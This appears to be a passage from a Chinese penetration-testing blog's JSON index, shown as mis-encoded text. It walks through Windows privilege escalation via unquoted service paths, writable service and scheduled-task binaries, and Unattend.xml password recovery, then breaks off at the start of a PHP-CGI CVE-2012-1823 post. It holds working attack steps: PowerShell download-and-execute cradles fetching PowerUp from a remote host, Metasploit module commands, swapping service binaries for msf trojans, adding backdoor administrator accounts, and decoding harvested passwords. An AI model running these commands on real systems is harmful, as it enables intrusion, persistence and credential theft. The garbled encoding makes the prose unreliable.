Folderâ€ç›®å½•ä¸‹ï¼Œç„¶ååˆ†åˆ«æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤é‡å¯è¯¥WhoamiTestæœåŠ¡ï¼š sc stop WhomaiTest sc start WhomaiTest å¦‚ä¸‹å›¾å®Œæ•´åˆ©ç”¨è¿‡ç¨‹ï¼š å¯çŸ¥ææƒå‰ä¸ºç®¡ç†å‘˜æƒé™ï¼ˆliukaifeng01ï¼‰ï¼ŒææƒæˆåŠŸåæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªsystemæƒé™çš„sessionã€‚ è¿™é‡Œä¹Ÿæ˜¯è§£æƒ‘äº†ï¼Œæ˜¯æˆ‘å¤ªå‚»ï¼ŒåŸæ¥åœ¨ä¸Šæ¬¡æ‰§è¡ŒCVE.exeä¹‹åï¼Œgetuidä¾¿å¯ä»¥å°†ææƒç»“æœå±•ç¤ºåœ¨meterpreterä¸­ è¿™é‡Œè¦æ³¨æ„ï¼Œæ–°åå¼¹å¾—åˆ°çš„meterpreterä¼šå¾ˆå¿«å°±ä¸­æ–­äº†ï¼Œè¿™æ˜¯å› ä¸ºå½“ä¸€ä¸ªè¿›ç¨‹åœ¨Windowsä¸­å¯åŠ¨åï¼Œå¿…é¡»ä¸æœåŠ¡æ§åˆ¶ç®¡ç†è¿›è¡Œé€šä¿¡ï¼Œå¦‚æœæ²¡æœ‰é€šä¿¡ï¼ŒæœåŠ¡æ§åˆ¶ç®¡ç†å™¨ä¼šè®¤ä¸ºå‡ºç°äº†é”™è¯¯ï¼Œè¿›è€Œç»ˆæ­¢è¿™ä¸ªè¿›ç¨‹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦åœ¨ç»ˆæ­¢è½½è·è¿›ç¨‹ä¹‹å‰å°†å®ƒè¿ç§»åˆ°å…¶ä»–è¿›ç¨‹ä¸­ï¼Œä½¿ç”¨msfçš„â€œset AutoRunScript migrate -fâ€å‘½ä»¤å³å¯å®ç°è‡ªåŠ¨è¿ç§»è¿›ç¨‹ï¼š è¯¥ææƒæ–¹æ³•åœ¨metasploitä¸­å¯¹åº”çš„æ¨¡å—ä¸ºï¼šexploit/windows/local/unquoted_service_pathï¼Œä½¿ç”¨å¦‚ä¸‹ï¼š ï¼ˆåœ¨ä¹‹å‰çš„metasploitä¸­ä¸ºexploit/windows/local/trusted_service_pathï¼Œä½†åœ¨æ–°ç‰ˆçš„metasploitä¸­æ›¿æ¢æ›¿æ¢æˆäº†exploit/windows/local/unquoted_service_pathï¼‰ use exploit/windows/local/unquoted_service_path set session 1 set AutoRunScript migrate -f exploit å¦‚ä¸Šå›¾ï¼ŒææƒæˆåŠŸ ç³»ç»ŸæœåŠ¡é”™è¯¯æƒé™é…ç½®æ¼æ´ Windows ç³»ç»ŸæœåŠ¡æ–‡ä»¶åœ¨æ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½å’Œæ‰§è¡Œï¼Œå¹¶åœ¨åå°è°ƒç”¨å¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªä½æƒé™çš„ç”¨æˆ·å¯¹æ­¤ç³»ç»ŸæœåŠ¡è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶æ‹¥æœ‰å†™æƒé™ï¼Œå°±å¯ä»¥å°†è¯¥æ–‡ä»¶æ›¿æ¢æˆä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶éšç€ç³»ç»ŸæœåŠ¡çš„å¯åŠ¨è·å¾—ç³»ç»Ÿæƒé™ã€‚**Windows æœåŠ¡æ˜¯ä»¥Systemæƒé™è¿è¡Œçš„ï¼Œå› æ­¤ï¼Œå…¶æ–‡ä»¶ã€æ–‡ä»¶å¤¹å’Œæ³¨å†Œè¡¨é”®å€¼éƒ½æ˜¯å—å¼ºè®¿é—®æ§åˆ¶æœºåˆ¶ä¿æŠ¤çš„ã€‚**ä½†æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿä¸­ä»ç„¶å­˜åœ¨ä¸€äº›æ²¡æœ‰å¾—åˆ°æœ‰æ•ˆä¿æŠ¤çš„æœåŠ¡ã€‚ è¯¥æ¼æ´åˆ©ç”¨æœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š æœåŠ¡æœªè¿è¡Œï¼šæ”»å‡»è€…ä¼šä½¿ç”¨ä»»æ„æœåŠ¡ç›´æ¥æ›¿æ¢åŸæ¥çš„æœåŠ¡ï¼Œç„¶åé‡å¯æœåŠ¡ã€‚ æœåŠ¡æ­£åœ¨è¿è¡Œä¸”æ— æ³•ç»ˆæ­¢ï¼šè¿™ç§æƒ…å†µç¬¦åˆç»å¤§å¤šæ•°æ¼æ´åˆ©ç”¨çš„åœºæ™¯ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨DLLåŠ«æŒæŠ€æœ¯å¹¶å°è¯•é‡å¯æœåŠ¡æ¥ææƒã€‚ 1. åˆ©ç”¨PowerUp.ps1è„šæœ¬ ä¸‹è½½åœ°å€ï¼šhttps://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªPowershellçš„è„šæœ¬â€”â€”PowerUpï¼Œè¯¥è„šæœ¬çš„AllChecksæ¨¡å—ä¼šæ£€æµ‹ç›®æ ‡ä¸»æœºå­˜çš„WindowsæœåŠ¡æ¼æ´ï¼Œç„¶åé€šè¿‡ç›´æ¥æ›¿æ¢å¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«æ¥å®ç°æƒé™çš„æå‡ã€‚ AllChecksæ¨¡å—çš„é€šå¸¸åº”ç”¨å¯¹è±¡å¦‚ä¸‹ï¼š æ²¡æœ‰è¢«å¼•å·å¼•èµ·æ¥çš„æœåŠ¡çš„è·¯å¾„ã€‚ æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™è®¾ç½®ä¸å½“ Unattend.xmlæ–‡ä»¶ æ³¨å†Œè¡¨é”®AlwaysInstallElevated å°†è¯¥è„šæœ¬è¿œç¨‹ä¸‹è½½æˆ–æœ¬åœ°å¯¼å…¥åï¼Œæ‰§è¡ŒInvoke-AllCheckså‘½ä»¤è¿›è¡Œæ¼æ´æ£€æµ‹ powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Invoke-ALLChecks\" è¿™é‡Œæ¨èå…ˆä¸‹è½½åˆ°æœ¬åœ°ï¼Œä¸è¿‡æˆ‘è¿™ä¸ªé¶æœºä¾æ—§æ²¡æœ‰æ­¤æ¼æ´ï¼Œè¿™é‡Œå°±ç›´æ¥ç”¨ä»–äººçš„äº† å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°PowerUpåˆ—å‡ºäº†æ‰€æœ‰å¯èƒ½å­˜åœ¨è¯¥æ¼æ´çš„æœåŠ¡çš„ä¿¡æ¯ï¼Œå¹¶åœ¨AbuseFunctionéƒ¨åˆ†ç›´æ¥ç»™å‡ºäº†åˆ©ç”¨æ–¹å¼ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç›®æ ‡ä¸»æœºçš„WhoamiTestæœåŠ¡å¯èƒ½å­˜åœ¨è¯¥æ¼æ´ï¼Œç„¶åæˆ‘ä»¬å†ç”¨icaclså‘½ä»¤æ¥æµ‹è¯•è¯¥æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶ç›®å½•çš„â€œC:\\Program Files\\Program Folder\\Hello Whoami\\whoami.exeâ€æ–‡ä»¶æ˜¯å¦æœ‰å†™å…¥æƒé™ï¼š icacls \"C:\\Program Files\\Program Folder\\Hello Whoami\\whoami.exe\" å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯¹whoami.exeæ–‡ä»¶æ˜¯æœ‰å®Œå…¨æ§åˆ¶æƒçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å°†whoami.exeæ›¿æ¢æˆæˆ‘ä»¬çš„msfé©¬ï¼Œå½“æœåŠ¡é‡å¯æ—¶ï¼Œæˆ‘ä»¬å°±ä¼šå¾—åˆ°ä¸€ä¸ªSystemæƒé™çš„meterpreterã€‚ è¿™é‡Œï¼Œæˆ‘ä»¬ç”¨â€œAbuseFunctionâ€é‚£é‡Œå·²ç»ç»™å‡ºçš„å…·ä½“æ“ä½œæ–¹å¼ï¼Œæ‰§è¡Œå¦‚ä¸‹ã€‚ å°†åŸæ¥çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶å¤‡ä»½ï¼Œå¹¶ç”¨ä¸€ä¸ªå¯æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„æ¶æ„å¯æ‰§è¡Œæ–‡ä»¶ä»£æ›¿å®ƒï¼Œé»˜è®¤æ·»åŠ çš„ç”¨æˆ·åä¸ºjoinï¼Œå¯†ç ä¸ºPassword123!ï¼š powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Install-ServiceBinary -ServiceName æœåŠ¡å æ¥ä¸‹æ¥åœæ­¢å¹¶å†å¯åŠ¨è¯¥æœåŠ¡çš„æ—¶å€™ï¼Œä½†ç”±äºæˆ‘ä»¬å½“å‰æ˜¯æ™®é€šç”¨æˆ·ï¼Œæˆ‘ä»¬æ²¡æœ‰æƒé™é‡å¯æœåŠ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç­‰ç›®æ ‡ç³»ç»Ÿé‡å¯ï¼Œæˆ‘ä»¬é€šè¿‡msfæ§åˆ¶ç›®æ ‡æœºæ‰§è¡Œâ€œshutdown -râ€å‘½ä»¤æ¥é‡å¯ï¼Œé‡å¯åå³å¯æˆåŠŸåˆ›å»ºjoinç”¨æˆ·ï¼š æ·»åŠ æŒ‡å®šçš„ç®¡ç†å‘˜ç”¨æˆ·ï¼š Install-ServiceBinary -ServiceName æœåŠ¡å -UserName Bunny -Password Liufupeng123 æ‰§è¡Œå‘½ä»¤ï¼š Install-ServiceBinary -ServiceName æœåŠ¡å -Command \"whoami\" // -CommandååŠ è¦æ‰§è¡Œçš„å‘½ä»¤ 2. Metasploitä¸­çš„service_permissionsæ¨¡å— è¯¥æ¼æ´ææƒåœ¨metasploitä¸Šé¢å¯¹åº”çš„æ¨¡å—ä¸ºexploit/windows/local/service_permissionsï¼š å¦‚ä¸Šå›¾ï¼Œè¯¥æ¨¡å—æœ‰ä¸¤ä¸ªå¯ä»¥è®¾ç½®çš„é€‰é¡¹ï¼Œå…¶ä¸­å¦‚æœæŠŠAGGRESSIVEé€‰é¡¹è®¾ä¸ºâ€œtrueâ€ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šæ¯ä¸€ä¸ªæœ‰è¯¥æ¼æ´çš„æœåŠ¡ï¼Œè®¾ä¸ºâ€œfalseâ€åˆ™åœ¨ç¬¬ä¸€æ¬¡ææƒæˆåŠŸåå°±ä¼šåœæ­¢å·¥ä½œã€‚æ¼”ç¤ºå¦‚ä¸‹ï¼š ï¼ˆåˆ«å¿˜äº†è¿ç§»è¿›ç¨‹å“¦~~ï¼‰ 0x04 è®¡åˆ’ä»»åŠ¡ä¸AccessChkä½¿ç”¨ å¦‚æœæ”»å‡»è€…å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨çš„ç›®å½•å…·æœ‰å†™æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–åŸæ¥çš„ç¨‹åºï¼Œè¿™æ ·åœ¨ä¸‹æ¬¡è®¡åˆ’æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™æ¥è¿è¡Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åºã€‚ä¸‹é¢è¯¦ç»†çš„è¿›è¡Œæ¼”ç¤ºã€‚ é¦–å…ˆå¯ä»¥åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è®¡ç®—æœºçš„è®¡åˆ’ä»»åŠ¡ï¼š schtasks /query /fo list /v schtasks /query /fo list /v &gt; schtasks.txt å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ C:\\Program Files\\schtasks\\whoamiç›®å½•æœ‰ä¸€ä¸ªtest.exeç¨‹åºï¼Œå®ƒä¼šåœ¨ä¸€ä¸ªæ—¶é—´ç‚¹è‡ªåŠ¨è¿è¡Œï¼Œå®ƒä¼šåœ¨è®¡ç®—æœºæ¯æ¬¡å¯åŠ¨æ—¶è¿è¡Œï¼Œå¹¶ä¸”æ˜¯ç”¨SYSTEMæƒé™è¿è¡Œçš„ã€‚ç„¶åè®©æˆ‘ä»¬çœ‹ä¸‹æˆ‘ä»¬å¯¹è¿™ä¸ªè®¡åˆ’ä»»åŠ¡çš„è·¯å¾„æ˜¯å¦æœ‰å†™å…¥æƒé™ã€‚ æˆ‘æ¨èä½¿ç”¨AccessChkå·¥å…·ï¼Œå…¶ä¸ºSysInteralså¥—ä»¶é‡Œçš„ä¸€ä¸ªå·¥å…·ï¼Œå¸¸ç”¨äºWindowsä¸­è¿›è¡Œä¸€äº›ç³»ç»Ÿæˆ–ç¨‹åºçš„é«˜çº§æŸ¥è¯¢ã€ç®¡ç†å’Œæ’é™¤æ•…éšœç­‰ã€‚AccessChkæ˜¯å¾®è½¯å®˜æ–¹çš„å·¥å…·ï¼Œä¸€èˆ¬ä¸ä¼šå¼•èµ·æ€è½¯çš„æŠ¥è­¦æ²¡æ‰€ä»¥å¸¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ä¸‹è½½åœ°å€ï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µï¼š accesschk.exe -dqv \"C:\\Program Files\\schtasks\\whoami\" -accepteula å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆä¸¥é‡çš„é…ç½®é”™è¯¯ï¼Œå¯¹äºè¿™ä¸ªè®¡åˆ’ä»»åŠ¡â€œtestâ€æ¥è¯´ï¼Œè¿™é‡Œä¸ä»…ç”¨äº†systemæƒé™æ¥è¿è¡Œï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ˆAuthenticated Usersï¼‰éƒ½å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æœ‰å†™å…¥çš„æƒé™ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªæœ¨é©¬ï¼Œåšä¸€ä¸ªåé—¨å°±å¯ä»¥äº†ï¼Œåœ¨æœ¬æ¬¡æ¼”ç¤ºä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„ç”¨msfæœ¨é©¬è¦†ç›–æ‰åŸæ¥çš„â€œtest.exeâ€ï¼Œå¦‚ä¸‹å›¾æˆ‘ä»¬å°†åŸæ¥çš„test.exeå¤‡ä»½åï¼Œä¸Šä¼ æˆ‘ä»¬è‡ªå·±ç”Ÿæˆçš„â€œtest.exeâ€ï¼ˆmsfæœ¨é©¬ï¼‰ï¼š ç„¶åé‡å¼€ä¸€ä¸ªmsfconsoleï¼Œè®¾ç½®å¥½ç›‘å¬ï¼Œæ¥ä¸‹æ¥å¯¹ç›®æ ‡æœºæ‰§è¡Œé‡å¯å‘½ä»¤â€œshutdown -r -t 0â€è®©å…¶é‡æ–°å¯åŠ¨ï¼š é‡æ–°å¯åŠ¨ç›®æ ‡ä¸»æœºåï¼Œåœ¨å¦ä¸€ä¸ªmsfconsoleä¸Šé¢å³å¯å¾—åˆ°systemæƒé™çš„sessionï¼š æˆåŠŸã€‚ AccessChkä½¿ç”¨ é€šè¿‡ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºaccesschkç§°å¾—ä¸Šæ˜¯æŸ¥æ‰¾æœ‰æƒé™é…ç½®ç¼ºé™·æ–‡ä»¶å¤¹çš„å¿…å¤‡å·¥å…·ï¼Œä¸‹é¢æ˜¯accesschkçš„ä¸€äº›å…¶ä»–ä½¿ç”¨å®ä¾‹ã€‚ å½“ç¬¬ä¸€æ¬¡æ‰§è¡Œä»»ä½•sysinternalså·¥å…·åŒ…é‡Œçš„å·¥å…·æ—¶ï¼Œå½“å‰ç”¨æˆ·å°†ä¼šçœ‹åˆ°ä¸€ä¸ªæœ€ç»ˆç”¨æˆ·è®¸å¯åè®®å¼¹æ¡†ï¼Œè¿™æ˜¯ä¸€ä¸ªå¤§é—®é¢˜ï¼Œç„¶è€Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªé¢å¤–çš„å‚æ•°â€œ/accepteulaâ€å»è‡ªåŠ¨æ¥å—è®¸å¯åè®®ï¼Œå³ï¼š accesschk.exe /accepteula Accesschkå¯ä»¥è‡ªåŠ¨çš„æ£€æŸ¥å½“æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç‰¹å®šçš„ç”¨æˆ·æ—¶ï¼Œæˆ‘ä»¬æ˜¯å¦å¯¹Windowsçš„æŸä¸ªæœåŠ¡æœ‰å†™çš„æƒé™ã€‚å½“æˆ‘ä»¬ä½œä¸ºä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼Œæˆ‘ä»¬é¦–å…ˆå°±æƒ³è¦çœ‹ä¸€ä¸‹â€œAuthenticated Usersâ€ç»„å¯¹è¿™äº›æœåŠ¡çš„æƒé™ã€‚ æ‰¾å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶å¤¹è·¯å¾„ accesschk.exe -uwdqs Users c:\\ accesschk.exe -uwdqs \"Authenticated Users\" c:\\ æ‰¾å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶ accesschk.exe -uwqs Users c:\\*.* accesschk.exe -uwqs \"Authenticated Users\" c:\\*.* å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°å¯¹è¿™ä¸ªç›®å½•ä¸‹çš„æ¯ä¸€ä¸ªæ–‡ä»¶å®ƒéƒ½åˆ—å‡ºäº†Authenticated Usersç”¨æˆ·ç»„çš„æƒé™ï¼ŒRä¸ºè¯»æƒé™ï¼ŒWä¸ºå†™æƒé™ï¼ŒRWè¡¨ç¤ºæœ‰è¯»å†™æƒé™ï¼Œå¦‚æœå‰é¢ä¸ºç©ºåˆ™è¡¨ç¤ºæ²¡æœ‰æƒé™ã€‚ æ ¹æ®å‰é¢è¿™å‡ ä¸ªææƒçš„æ€è·¯ï¼Œå½“æˆ‘ä»¬æ£€æŸ¥æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æƒé™çš„æ—¶å€™ï¼Œéœ€è¦è€ƒè™‘å“ªäº›ç‚¹æ˜¯æ˜“å—æ”»å‡»çš„ç‚¹ã€‚ä½ éœ€è¦èŠ±è´¹æ—¶é—´æ¥æ£€æŸ¥æ‰€æœ‰çš„å¯åŠ¨è·¯å¾„ï¼ŒWindowsæœåŠ¡ï¼Œè®¡åˆ’ä»»åŠ¡å’ŒWindowså¯åŠ¨é¡¹ç­‰ã€‚ è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶ ç½‘ç»œç®¡ç†å‘˜åœ¨å†…ç½‘ä¸­ç»™å¤šå°æœºå™¨é…ç½®åŒä¸€ä¸ªç¯å¢ƒæ—¶ï¼Œé€šå¸¸ä¸ä¼šé€å°é…ç½®ï¼Œè€Œæ˜¯ä¼šé‡‡ç”¨è„šæœ¬åŒ–æ‰¹é‡éƒ¨ç½²çš„æ–¹æ³•ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œä¼šä½¿ç”¨å®‰è£…é…ç½®æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶ä¸­åŒ…å«æ‰€æœ‰çš„å®‰è£…é…ç½®ä¿¡æ¯ï¼Œå…¶ä¸­çš„ä¸€äº›è¿˜å¯èƒ½åŒ…å«æœ¬åœ°ç®¡ç†å‘˜çš„è´¦å·å’Œå¯†ç ç­‰ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥å¯¹æ•´ä¸ªç³»ç»Ÿè¿›è¡Œæ£€æŸ¥ï¼Œè¿™äº›å®‰è£…é…ç½®æ–‡æ–‡ä»¶åˆ—ä¸¾å¦‚ä¸‹ï¼š - C:\\sysprep.inf - C:\\syspreg\\sysprep.xml - C:\\Windows\\system32\\sysprep.inf - C:\\windows\\system32\\sysprep\\sysprep.xml - C:\\unattend.xml - C:\\Windows\\Panther\\Unattend.xml - C:\\Windows\\Panther\\Unattended.xml - C:\\Windows\\Panther\\Unattend\\Unattended.xml - C:\\Windows\\Panther\\Unattend\\Unattend.xml - C:\\Windows\\System32\\Sysprep\\Unattend.xml - C:\\Windows\\System32\\Sysprep\\Panther\\Unattend.xml å…¨ç›˜æœç´¢Unattendæ–‡ä»¶æ˜¯ä¸ªå¥½åŠæ³•ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å…¨ç›˜æœç´¢Unattend.xmlæ–‡ä»¶ï¼š dir /b /s c:\\Unattend.xml /Sï¼šæ˜¾ç¤ºæŒ‡å®šç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚ é™¤äº†Unattend.xmlæ–‡ä»¶å¤–ï¼Œè¿˜è¦ç•™æ„ç³»ç»Ÿä¸­çš„sysprep.xmlå’Œsysprep.infæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¸­éƒ½ä¼šåŒ…å«éƒ¨ç½²æ“ä½œç³»ç»Ÿæ—¶ä½¿ç”¨çš„å‡­æ®ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬ææƒã€‚ æ‰“å¼€æ–‡ä»¶ä¹‹åæ ¼å¼ä¸ºxmlæ ¼å¼ç„¶åå¯ä»¥è¿›è¡Œæœç´¢Userã€Accountsã€UserAccountsã€LocalAccountsã€Administratorã€Passwordæˆ–è€…ç»è¿‡base64åŠ å¯†çš„å¯†ç ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦è¿™éƒ¨åˆ†ï¼Œä¾‹å¦‚ï¼š ...... &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount&gt; &lt;Password&gt; &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ=&lt;/Value&gt; &lt;PlainText&gt;false&lt;/PlainText&gt; &lt;/Password&gt; &lt;Description&gt;Local Administrator&lt;/Description&gt; &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt; &lt;Group&gt;Administrators&lt;/Group&gt; &lt;Name&gt;Administrator&lt;/Name&gt; &lt;/LocalAccount&gt; &lt;/LocalAccounts&gt; &lt;/UserAccounts&gt; ...... åœ¨è¿™ä¸ªUnattendæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæœ¬åœ°è´¦æˆ·è¢«åˆ›å»ºå¹¶åŠ å…¥åˆ°äº†ç®¡ç†å‘˜ç»„ä¸­ã€‚ç®¡ç†å‘˜å¯†ç æ²¡æœ‰ä»¥æ˜æ–‡å½¢å¼æ˜¾ç¤ºï¼Œä½†æ˜¯æ˜¾ç„¶å¯†ç æ˜¯ä»¥Base64è¿›è¡Œç¼–ç çš„ã€‚ echo \"UEBzc3dvcmQxMjMhUGFzc3dvcmQ=\" | base64 -d è§£å¯†å¾—å¯†ç ä¸º\"P@ssword123!Password\"ï¼Œä½†æ˜¯å¾®è½¯åœ¨è¿›è¡Œç¼–ç å‰ä¼šåœ¨Unattendæ–‡ä»¶ä¸­æ‰€æœ‰çš„å¯†ç åé¢éƒ½è¿½åŠ \"Password\"ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ¬åœ°ç®¡ç†å‘˜çš„å¯†ç å®é™…ä¸Šæ˜¯\"P@ssword123!\"ã€‚ 1. åœ¨Metasploitä¸­åˆ©ç”¨çš„ç›¸åº”æ¨¡å—ä¸ºpost/windows/gather/enum_unattend è¿™ä¸ªæ¨¡å—ä»…ä»…åªæ˜¯æœç´¢Unattend.xmlæ–‡ä»¶ï¼Œç„¶è€Œä¼šå¿½ç•¥å…¶ä»–åƒsyspref.xmlå’Œsyspref.infè¿™æ ·çš„æ–‡ä»¶ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªæ¨¡å—å°±æ˜¯å…¨ç›˜æœç´¢Unattend.xmlæ–‡ä»¶å¹¶è¯»å–å‡ºç®¡ç†å‘˜è´¦æˆ·å¯†ç ã€‚ 2. PowerUpä¸­åˆ©ç”¨çš„æ¨¡å— powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ip/powerup.ps1');Get-UnattendedInstallFile\" 0x04 åè¨€ æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ä»‹ç»äº†Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒå’Œwindowsç³»ç»Ÿé”™è¯¯é…ç½®æ¼æ´ææƒçš„å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´ææƒã€ç³»ç»ŸæœåŠ¡é”™è¯¯æƒé™é…ç½®æ¼æ´ææƒã€è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶ææƒã€‚å…¶ä¸­æœ€å¸¸ç”¨çš„å¯èƒ½å°±æ˜¯Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒäº†ï¼Œwindowsç³»ç»Ÿé”™è¯¯é…ç½®æ¼æ´ä¸ä»…å¯ä»¥ç”¨æ¥ææƒï¼Œåœ¨è·å–é«˜æƒé™åè¿˜å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€ä¸ªé«˜æƒé™åé—¨ï¼Œä»¥å¤‡åç”¨ã€‚ ä¸è¿‡æ„Ÿè§‰æˆ‘åªæ˜¯æŠ„äº†ä¸€éè€Œå·²ï¼Œå› æ­¤æˆ‘è¿˜æ˜¯æç‚¹é¶åœºåœ¨å®æˆ˜ä¸­å­¦ä¹ å§ï¼Œæ¯•ç«Ÿé¶åœºä¸­è‚¯å®šæ¬¡æ¬¡å¾—ææƒã€‚ æƒ³äº†æƒ³æ—¥åçš„ææƒæ–‡ç« ï¼Œè¿˜æ˜¯é’ˆå¯¹æŸç§ç±»å‹å•ç‹¬å†™å‡ºæ¥å§ï¼Œæ„Ÿè§‰æ•ˆæœä¼šå¥½ä¸€ç‚¹ã€‚","tags":["Windows ææƒ"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰","path":"/2023/09/19/php-cgi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2012-1823/","content":"0x01 æ¼æ´ä»‹ç» è¿™ä¸ªæ¼æ´ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç”¨æˆ·è¯·æ±‚çš„querystringï¼ˆquerystringå­—é¢ä¸Šçš„æ„æ€å°±æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬æ˜¯å¯¹httpè¯·æ±‚æ‰€å¸¦çš„æ•°æ®è¿›è¡Œè§£æï¼Œè¿™é‡Œä¹Ÿæ˜¯æŒ‡httpè¯·æ±‚ä¸­æ‰€å¸¦çš„æ•°æ®ï¼‰è¢«ä½œä¸ºäº†php-cgiçš„å‚æ•°ï¼Œæœ€ç»ˆå¯¼è‡´äº†ä¸€ç³»åˆ—ç»“æœã€‚ å½±å“èŒƒå›´ï¼š æ¼æ´å½±å“ç‰ˆæœ¬ php &lt; 5.3.12 or php &lt; 5.4.2 PS:CVE-2012-1823æ˜¯åœ¨php-cgiè¿è¡Œæ¨¡å¼ä¸‹å‡ºç°çš„æ¼æ´ï¼Œå…¶æ¼æ´åªå‡ºç°åœ¨ä»¥cgiæ¨¡å¼è¿è¡Œçš„phpä¸­ cgiæ¨¡å¼ä¸‹æœ‰å¦‚ä¸‹å¯æ§å‘½ä»¤è¡Œå‚æ•°å¯ç”¨ï¼š -c æŒ‡å®šphp.iniæ–‡ä»¶ï¼ˆPHPçš„é…ç½®æ–‡ä»¶ï¼‰çš„ä½ç½® -n ä¸è¦åŠ è½½php.iniæ–‡ä»¶ -d æŒ‡å®šé…ç½®é¡¹ -b å¯åŠ¨fastcgiè¿›ç¨‹ -s æ˜¾ç¤ºæ–‡ä»¶æºç  -T æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶ -hå’Œ-? æ˜¾ç¤ºå¸®åŠ© 0x02 CGIç®€å•ä»‹ç» - php-cgiæ˜¯ä¸€ä¸ªç±»ä¼¼äºæ¶ˆæ¯çš„â€œä¼ 